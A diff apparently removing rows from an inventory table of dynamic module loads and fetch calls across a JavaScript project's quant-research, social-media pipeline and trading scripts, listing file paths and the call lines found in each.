-| scripts/research/edge2/dna.cjs | require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) |
-| scripts/research/edge2/dna.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/research/edge2/edge2.cjs | require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) |
-| scripts/research/edge2/edge2.cjs | require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) |
-| scripts/research/edge2/edge2.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/research/edge2/ki-export.cjs | require(path.join(ROOT, 'quant/engines/published-close.js')) |
-| scripts/research/edge2/ki-forward.cjs | require(path.join(ROOT, 'quant/engines/published-close.js')) |
-| scripts/research/edge2/ki-forward.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), MD = require(path.join(ROOT, 'scripts/quant/portfolio/model-depots.cjs')) |
-| scripts/research/edge2/paper.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), MD = require(path.join(ROOT, 'scripts/quant/portfolio/model-depots.cjs')) |
-| scripts/research/edge2/paper.cjs | import(path.join(ROOT, 'scripts/research/signals/study.mjs')).then(S1 => { |
-| scripts/research/edge2/paper.cjs | require(path.join(ROOT, 'quant/engines/technical/trade-setup.js')) }) |
-| scripts/research/edge2/run-blind.cjs | require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) |
-| scripts/research/edge2/run-blind.cjs | require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) |
-| scripts/research/edge2/run-blind.cjs | import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) |
-| scripts/research/edge2/run-blind.cjs | import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/research/edge2/run-blind.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) |
-| scripts/research/edge2/run-dna.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), E3 = require('../edge/run-e3.cjs') |
-| scripts/research/edge2/run-dna.cjs | import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) |
-| scripts/research/edge2/run-edge2.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) |
-| scripts/research/edge2/run-edge2.cjs | require(path.join(ROOT, 'quant/engines/research-delisted-series.cjs')) |
-| scripts/research/edge2/run-edge2.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), E3 = require('../edge/run-e3.cjs') |
-| scripts/research/edge2/run-edge2.cjs | import(path.join(ROOT, 'scripts/research/signals/study.mjs')) |
-| scripts/research/edge2/run-edge2.cjs | require(path.join(ROOT, 'quant/engines/technical/trade-setup.js')) |
-| scripts/research/edge2/run-edge2.cjs | import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) |
-| scripts/research/holdout/combine.mjs | import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) |
-| scripts/research/holdout/holdout.test.cjs | import(path.join(ROOT, 'scripts/supertrader/source-faithful/research/run-st-holdout.mjs')) |
-| scripts/research/holdout/holdout.test.cjs | import(path.join(__dirname, 'ledger.mjs')) |
-| scripts/research/holdout/holdout.test.cjs | import(path.join(ROOT, 'scripts/supertrader/source-faithful/research/run-st-holdout.mjs')) |
-| scripts/research/holdout/holdout.test.cjs | import(path.join(__dirname, 'combine.mjs')) |
-| scripts/research/holdout/quant-holdout.cjs | import(path.join(ROOT, 'scripts/research/holdout/ledger.mjs')) |
-| scripts/research/holdout/quant-holdout.cjs | import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/research/holdout/quant-holdout.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), E3 = require('../edge/run-e3.cjs') |
-| scripts/research/holdout/quant-holdout.cjs | import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) |
-| scripts/research/labor/build-insider.mjs | require(path.join(ROOT, 'quant/engines/ownership-signals.js')) |
-| scripts/research/labor/build-insider.mjs | import(path.join(ROOT, 'scripts/market/build-ownership-signals.mjs')) |
-| scripts/research/labor/etf-engine.cjs | require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) |
-| scripts/research/labor/run-labor.cjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) |
-| scripts/research/labor/run-labor.cjs | require(path.join(ROOT, 'scripts/research/edge/quant-e3.cjs')) |
-| scripts/research/labor/run-labor.cjs | require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) |
-| scripts/research/labor/signals.cjs | require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) |
-| scripts/research/labor/stats.cjs | require(path.join(__dirname, '../edge/study.cjs')) |
-| scripts/research/labor/stock-engine.cjs | require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) |
-| scripts/research/labor/stock-engine.cjs | require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) |
-| scripts/research/labor/stock-engine.cjs | require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) |
-| scripts/research/labor/stock-engine.cjs | require(path.join(ROOT, 'scripts/research/edge/quant-e3.cjs')) |
-| scripts/screener/browser-qa.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; '/opt/node22/lib/node_modules/playwright') |
-| scripts/social/approval-center-readiness.mjs | require(join(ROOT, "social/engines/owner-decision.js")) |
-| scripts/social/assert-no-secrets.mjs | require(join(ROOT, "social/engines/provider.js")) |
-| scripts/social/assess-creative-quality.mjs | require(join(ROOT, "social/engines/story-selection.js")) |
-| scripts/social/assess-creative-quality.mjs | require(join(ROOT, "social/engines/creative-quality.js")) |
-| scripts/social/assess-creative-quality.mjs | require(join(ROOT, "social/engines/score-decomposition.js")) |
-| scripts/social/asset-hashtag-done.mjs | require(join(ROOT, "social/engines/hashtags.js")) |
-| scripts/social/asset-hashtag-done.mjs | require(join(ROOT, "social/engines/content-ladder.js")) |
-| scripts/social/asset-hashtag-done.mjs | require(join(ROOT, "social/engines/owner-decision.js")) |
-| scripts/social/asset-hashtag-done.mjs | require(join(ROOT, "social/engines/approval-projection.js")) |
-| scripts/social/asset-hashtag-done.mjs | fetch(WORKER + pfad, { method: "GET" }) |
-| scripts/social/backfill-account-memory.mjs | require(join(ROOT, "social/engines/evidence-regime.js")) |
-| scripts/social/build-opportunity-slate.mjs | require(join(ROOT, "social/engines/content-universe.js")) |
-| scripts/social/build-opportunity-slate.mjs | require(join(ROOT, "social/engines/discover-evidence.js")) |
-| scripts/social/build-opportunity-slate.mjs | require(join(ROOT, "social/engines/signals.js")) |
-| scripts/social/build-opportunity-slate.mjs | require(join(ROOT, "social/engines/german-text.js")) |
-| scripts/social/build-opportunity-slate.mjs | require(join(ROOT, "social/engines/fact-check.js")) |
-| scripts/social/build-research-package.mjs | require(join(ROOT, "social/engines/research-package.js")) |
-| scripts/social/build-research-package.mjs | fetch(url, { signal: controller.signal, redirect: "follow", |
-| scripts/social/check-asset-reachability.mjs | require(join(ROOT, "social/engines/asset-delivery.js")) |
-| scripts/social/check-asset-reachability.mjs | fetch(url, { method: "GET", redirect: "manual" }) |
-| scripts/social/check-hard-invariants.mjs | require(join(ROOT, "social/engines/hard-invariants.js")) |
-| scripts/social/check-hard-invariants.mjs | require(join(ROOT, "social/engines/source-registry.js")) |
-| scripts/social/check-hard-invariants.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/check-hard-invariants.mjs | import(     join(ROOT, "workers/vision-universe-social/src/index.js"))).default |
-| scripts/social/check-hard-invariants.mjs | fetch(new Request( |
-| scripts/social/creative-job-report.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/decide-candidate.mjs | require(join(ROOT, "social/engines/content-hash.js")) |
-| scripts/social/decide-candidate.mjs | require(join(ROOT, "social/engines/owner-decision.js")) |
-| scripts/social/diagnose-creative-provider.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/discover-creators.mjs | require(join(ROOT, "social/engines/creator-universe.js")) |
-| scripts/social/discover-creators.mjs | require(join(ROOT, "social/engines/youtube-source.js")) |
-| scripts/social/discover-creators.mjs | require(join(ROOT, "social/engines/youtube-query-portfolio.js")) |
-| scripts/social/discover-creators.mjs | fetch(url, { headers: { "X-goog-api-key": key } }) |
-| scripts/social/dispatch-creative-job.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/dispatch-creative-job.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/dispatch-publications.mjs | require(join(ROOT, "social/engines/publishing.js")) |
-| scripts/social/dispatch-publications.mjs | require(join(ROOT, "social/engines/autonomy.js")) |
-| scripts/social/dispatch-publications.mjs | require(join(ROOT, "social/engines/kill-switch.js")) |
-| scripts/social/enrich-youtube-metrics.mjs | require(join(ROOT, "social/engines/youtube-source.js")) |
-| scripts/social/enrich-youtube-metrics.mjs | require(join(ROOT, "social/engines/external-patterns.js")) |
-| scripts/social/enrich-youtube-metrics.mjs | require(join(ROOT, "social/engines/external-intelligence.js")) |
-| scripts/social/enrich-youtube-metrics.mjs | fetch(url, { headers: { "X-goog-api-key": key } }) |
-| scripts/social/fetch-meta-status.mjs | fetch(workerUrl + path, { |
-| scripts/social/ig-reel.mjs | fetch(req.url, { method: req.method, headers: Object.assign({ authorization: "Bearer " + key }, |
-| scripts/social/ig.mjs | fetch(url, { headers: { authorization: "Bearer " + key } }) |
-| scripts/social/ingest-creative.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/ingest-creative.mjs | require(join(ROOT, "social/engines/asset-integrity.js")) |
-| scripts/social/ingest-creative.mjs | require(join(ROOT, "social/engines/invocation-ledger.js")) |
-| scripts/social/ingest-creative.mjs | require(join(ROOT, "social/engines/creative-contract.js")) |
-| scripts/social/ingest-creative.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/ingest-external-observation.mjs | require(join(ROOT, "social/engines/external-intelligence.js")) |
-| scripts/social/ingest-external-observation.mjs | require(join(ROOT, "social/engines/hashtag-portfolio.js")) |
-| scripts/social/ingest-external-observation.mjs | require(join(ROOT, "social/engines/external-patterns.js")) |
-| scripts/social/ingest-open-creative-jobs.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/ingest-owner-decisions.mjs | fetch(WORKER + "/social/approval/decisions", { |
-| scripts/social/ingest-performance.mjs | require(join(ROOT, "social/engines/schema.js")) |
-| scripts/social/ingest-performance.mjs | require(join(ROOT, "social/engines/measurement-window.js")) |
-| scripts/social/make-carousel-candidates.mjs | require(join(ROOT, "social/engines/content-hash.js")) |
-| scripts/social/make-carousel-candidates.mjs | require(join(ROOT, "social/engines/style-references.js")) |
-| scripts/social/make-carousel-candidates.mjs | require(join(ROOT, "quant/engines/hash.js")) |
-| scripts/social/make-carousel-candidates.mjs | require(join(ROOT, "social/engines/creative-gate.js")) |
-| scripts/social/make-carousel-candidates.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/make-carousel-candidates.mjs | require(join(ROOT, "social/engines/creative-contract.js")) |
-| scripts/social/make-carousel-candidates.mjs | require(join(ROOT, "social/config/cadence.json")) |
-| scripts/social/make-publish-candidate.mjs | require(join(ROOT, "social/engines/content-hash.js")) |
-| scripts/social/make-publish-candidate.mjs | require(join(ROOT, "social/engines/hashtags.js")) |
-| scripts/social/make-publish-candidate.mjs | require(join(ROOT, "social/engines/owner-decision.js")) |
-| scripts/social/make-publish-candidate.mjs | require(join(ROOT, "quant/engines/hash.js")) |
-| scripts/social/make-publish-candidate.mjs | require(join(ROOT, "social/engines/creative-gate.js")) |
-| scripts/social/make-publish-candidate.mjs | require(join(ROOT, "social/engines/manual-mode.js")) |
-| scripts/social/make-test-asset.mjs | fetch(       "https://fonts.googleapis.com/css2?family=Inter:wght@400 |
-| scripts/social/make-test-asset.mjs | fetch(url).then((r) => r.arrayBuffer())) |
-| scripts/social/manual-now-web-candidate.mjs | require(join(ROOT, "social/engines/content-hash.js")) |
-| scripts/social/manual-now-web-candidate.mjs | require(join(ROOT, "social/engines/owner-decision.js")) |
-| scripts/social/manual-now-web-candidate.mjs | require(join(ROOT, "quant/engines/hash.js")) |
-| scripts/social/manual-now-web-candidate.mjs | require(join(ROOT, "social/engines/creative-gate.js")) |
-| scripts/social/manual-now-web-candidate.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/manual-now-web-candidate.mjs | require(join(ROOT, "social/config/cadence.json")) |
-| scripts/social/open-creative-request.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/open-creative-request.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/order-d-done.mjs | require(join(ROOT, "social/engines/hard-invariants.js")) |
-| scripts/social/order-d-done.mjs | require(join(ROOT, "social/engines/no-post.js")) |
-| scripts/social/order-d-done.mjs | require(join(ROOT, "social/engines/run-lease.js")) |
-| scripts/social/order-d-done.mjs | require(join(ROOT, "social/engines/frequency-learning.js")) |
-| scripts/social/order-d-done.mjs | fetch(WORKER + pfad, init) |
-| scripts/social/plan-hashtag-observation.mjs | require(join(ROOT, "social/engines/hashtag-portfolio.js")) |
-| scripts/social/preflight-worker.mjs | fetch(request, |
-| scripts/social/preflight-worker.mjs | fetch(API + path, Object.assign({ |
-| scripts/social/product-proof.mjs | require(join(ROOT, "social/engines/brand.js")) |
-| scripts/social/product-proof.mjs | require(join(ROOT, "social/engines/visual-grammar.js")) |
-| scripts/social/product-proof.mjs | require(join(ROOT, "social/engines/scroll-stop.js")) |
-| scripts/social/product-proof.mjs | require(join(ROOT, "social/engines/content.js")) |
-| scripts/social/product-proof.mjs | require(join(ROOT, "social/engines/hashtags.js")) |
-| scripts/social/product-proof.mjs | require(join(ROOT, "social/engines/learning-unit.js")) |
-| scripts/social/product-proof.mjs | require(join(ROOT, "social/engines/audience-frame.js")) |
-| scripts/social/product-proof.mjs | require(   join(ROOT, "social/engines/visual-intelligence.js")) |
-| scripts/social/product-proof.mjs | require(   join(ROOT, "social/engines/visual-composition.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/production-readiness.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/source-registry.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/orchestrator.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/visual-intelligence.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/visual-quality.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/own-performance.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/schema.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/learning.js")) |
-| scripts/social/production-readiness.mjs | require(join(ROOT, "social/engines/owner-decision.js")) |
-| scripts/social/production-readiness.mjs | import(${JSON.stringify(join(ROOT, pfad))}) |
-| scripts/social/prove-loop-closure.mjs | require(join(ROOT, "social/engines/evidence-regime.js")) |
-| scripts/social/provision-cloudflare.mjs | fetch(API + path, Object.assign({ |
-| scripts/social/publish-approval-queue.mjs | require(join(ROOT, "social/engines/owner-decision.js")) |
-| scripts/social/publish-approval-queue.mjs | require(join(ROOT, "social/engines/approval-projection.js")) |
-| scripts/social/publish-approval-queue.mjs | require(join(ROOT, "social/engines/asset-delivery.js")) |
-| scripts/social/publish-approval-queue.mjs | require(join(ROOT, "social/engines/content-hash.js")) |
-| scripts/social/publish-approval-queue.mjs | require(join(ROOT, "social/engines/hashtags.js")) |
-| scripts/social/publish-approval-queue.mjs | fetch(url, { method: "GET", redirect: "manual" }) |
-| scripts/social/rank-social-opportunities.mjs | require(join(ROOT, "social/engines/opportunity.js")) |
-| scripts/social/rank-social-opportunities.mjs | require(join(ROOT, "social/engines/social-opportunity.js")) |
-| scripts/social/rank-social-opportunities.mjs | require(join(ROOT, "social/engines/brand.js")) |
-| scripts/social/rank-social-opportunities.mjs | require(join(ROOT, "social/engines/audience-frame.js")) |
-| scripts/social/rank-social-opportunities.mjs | require(join(ROOT, "social/engines/memory.js")) |
-| scripts/social/rank-social-opportunities.mjs | require(join(ROOT, "social/engines/source-registry.js")) |
-| scripts/social/rank-social-opportunities.mjs | require(join(ROOT, "social/engines/own-performance.js")) |
-| scripts/social/rank-social-opportunities.mjs | require(join(ROOT, "social/engines/learning.js")) |
-| scripts/social/reconcile-creative-jobs.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/recover-asset-transfer.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/recover-asset-transfer.mjs | require(join(ROOT, "social/engines/asset-transport.js")) |
-| scripts/social/recover-asset-transfer.mjs | require(join(ROOT, "social/engines/asset-integrity.js")) |
-| scripts/social/recover-creative-request.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/recover-creative-request.mjs | require(join(ROOT, "social/engines/provider-lifecycle.js")) |
-| scripts/social/recover-creative-request.mjs | require(join(ROOT, "social/engines/invocation-ledger.js")) |
-| scripts/social/render-asset.mjs | require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/visual-quality.js")) |
-| scripts/social/render-asset.mjs | require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/visual-grammar.js")) |
-| scripts/social/render-asset.mjs | require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/scroll-stop.js")) |
-| scripts/social/render-asset.mjs | require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/brand.js")) |
-| scripts/social/render-asset.mjs | require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/content-intelligence.js")) |
-| scripts/social/render-asset.mjs | require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/visual-composition.js")) |
-| scripts/social/request-carousel.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/request-carousel.mjs | require(join(ROOT, "social/engines/invocation-ledger.js")) |
-| scripts/social/request-carousel.mjs | require(join(ROOT, "social/engines/social-learnings.js")) |
-| scripts/social/request-carousel.mjs | require(join(ROOT, "social/engines/brand.js")) |
-| scripts/social/request-carousel.mjs | require(join(ROOT, "social/engines/style-references.js")) |
-| scripts/social/request-creative-revision.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/request-creative-revision.mjs | require(join(ROOT, "social/engines/story-selection.js")) |
-| scripts/social/request-creative-revision.mjs | require(join(ROOT, "social/engines/creative-quality.js")) |
-| scripts/social/request-creative-revision.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/request-creative-revision.mjs | require(join(ROOT, "social/engines/creative-contract.js")) |
-| scripts/social/request-creative-revision.mjs | require(join(ROOT, "social/engines/authoring.js")) |
-| scripts/social/request-creative-revision.mjs | require(join(ROOT, "social/engines/asset-store.js")) |
-| scripts/social/request-creative-web.mjs | require(join(ROOT, "social/engines/content-brief.js")) |
-| scripts/social/request-creative-web.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/request-creative-web.mjs | require(join(ROOT, "social/engines/invocation-ledger.js")) |
-| scripts/social/request-creative-web.mjs | require(join(ROOT, "social/engines/brand.js")) |
-| scripts/social/request-creative.mjs | require(join(ROOT, "social/engines/evidence-package.js")) |
-| scripts/social/request-creative.mjs | require(join(ROOT, "social/engines/content-brief.js")) |
-| scripts/social/request-creative.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/request-creative.mjs | require(join(ROOT, "social/engines/invocation-ledger.js")) |
-| scripts/social/request-creative.mjs | require(join(ROOT, "social/engines/visual-motif.js")) |
-| scripts/social/request-creative.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/research-web-story.mjs | require(join(ROOT, "social/engines/web-research.js")) |
-| scripts/social/research-web-story.mjs | require(join(ROOT, "social/engines/rss-parse.js")) |
-| scripts/social/research-web-story.mjs | fetch(quelle.url, { |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/orchestrator.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/source-registry.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/measurement-window.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/evidence-package.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/content-cadence.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/no-post.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/content-ladder.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/hard-invariants.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/run-lease.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/frequency-learning.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/manual-mode.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/hook.js")) |
-| scripts/social/run-orchestrator.mjs | require(join(ROOT, "social/engines/audience-frame.js")) |
-| scripts/social/run-post-job.mjs | require(join(ROOT, "social/engines/post-queue.js")) |
-| scripts/social/run-post-job.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/schema.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/strategy-memory.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/signals.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/trend-score.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/opportunity.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/strategy.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/content.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/visual-composition.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/visual-intelligence.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/learning-unit.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/visual-grammar.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/hook.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/memory.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/fatigue.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/publishing.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/analytics.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/performance.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/learning.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/experiments.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/evidence-regime.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/measurement-window.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/explain.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/health.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/autonomy.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/kill-switch.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/audit-log.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/provider.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/capabilities.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/brand.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/authoring.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/content-brief.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/evidence-package.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/providers/authoring/template/adapter.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/providers/authoring/model/adapter.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/provider-lifecycle.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/creative-contract.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/audience-fit.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/audience-frame.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/content-ladder.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/learning-dimensions.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/content-universe.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/invocation-ledger.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/providers/mock/adapter.js")) |
-| scripts/social/run-social-cycle.mjs | require(join(ROOT, "social/providers/meta/adapter.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/product-readiness.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/visual-intelligence.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, pfad)) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/content.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/audience-frame.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, pfad)) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/content.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, pfad)) |
-| scripts/social/social-os-ready.mjs | import("file://" + join(ROOT, "scripts/social/render-asset.mjs")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, pfad)) |
-| scripts/social/social-os-ready.mjs | import(     "file://" + join(ROOT, "scripts/social/render-asset.mjs")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, pfad)) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/content-cadence.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/orchestrator.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/content-cadence.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, pfad)) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/content.js")) |
-| scripts/social/social-os-ready.mjs | require(join(ROOT, "social/engines/memory.js")) |
-| scripts/social/store-asset.mjs | require(join(ROOT, "social/engines/asset-store.js")) |
-| scripts/social/store-asset.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/sync-creative-invocations.mjs | require(join(ROOT, "social/engines/invocation-ledger.js")) |
-| scripts/social/sync-creative-invocations.mjs | require(join(ROOT, "social/engines/provider-lifecycle.js")) |
-| scripts/social/verify-approval-center.mjs | fetch(WORKER + pfad, Object.assign({ redirect: "manual" }, init)) |
-| scripts/social/verify-creative-dispatch.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| scripts/social/verify-hashtag-access.mjs | require(join(ROOT, "social/engines/hashtag-access.js")) |
-| scripts/social/verify-hashtag-access.mjs | require(join(ROOT, "social/engines/hashtag-portfolio.js")) |
-| scripts/social/verify-hashtag-access.mjs | fetch(WORKER + pfad, { |
-| scripts/social/verify-manual-dispatch.mjs | fetch(WORKER + pfad, Object.assign({ redirect: "manual" }, init)) |
-| scripts/social/verify-meta-capabilities.mjs | require(join(ROOT, "social/providers/meta/adapter.js")) |
-| scripts/social/verify-meta-capabilities.mjs | require(join(ROOT, "social/engines/capabilities.js")) |
-| scripts/social/verify-revision-result.mjs | require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) |
-| scripts/social/verify-revision-result.mjs | require(join(ROOT, "social/engines/creative-contract.js")) |
-| scripts/social/verify-revision-result.mjs | require(join(ROOT, "social/engines/asset-store.js")) |
-| scripts/social/verify-worker.mjs | fetch(baseUrl + path, Object.assign({ redirect: "manual" }, init)) |
-| scripts/social/verify-worker.mjs | fetch(bildUrl, { method: "HEAD", redirect: "follow" }) |
-| scripts/supertrader/house/live.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/house/live.mjs | require(path.join(root, 'quant/engines/zero-cost-guard.js')) |
-| scripts/supertrader/house/live.mjs | fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) |
-| scripts/supertrader/house/live.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
